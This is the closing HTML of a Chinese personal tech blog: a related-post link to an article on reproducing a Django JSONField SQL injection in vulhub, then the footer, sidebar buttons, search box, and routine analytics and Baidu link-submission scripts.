title="基于vulhub复现Django JSONField SQL注入漏洞（CVE-2019-14234）"><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0156.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="基于vulhub复现Django JSONField SQL注入漏洞（CVE-2019-14234）"/></a><div class="content"><a class="title" href="/2021/05/13/2021/2021-05-13-django_CVE-2019-14234/" title="基于vulhub复现Django JSONField SQL注入漏洞（CVE-2019-14234）">基于vulhub复现Django JSONField SQL注入漏洞（CVE-2019-14234）</a><time datetime="2021-05-12T16:00:00.000Z" title="发表于 2021-05-13 00:00:00">2021-05-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0195.png)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By MambaInVeins</div><div class="footer_custom_text"><a href="http://mambainveins.gitee.io/">Mamba Never Out</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script>(function(){
+  const bp = document.createElement('script');
+  const curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https') {
+    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  bp.dataset.pjax = ''
+  const s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})()</script></div></body></html>
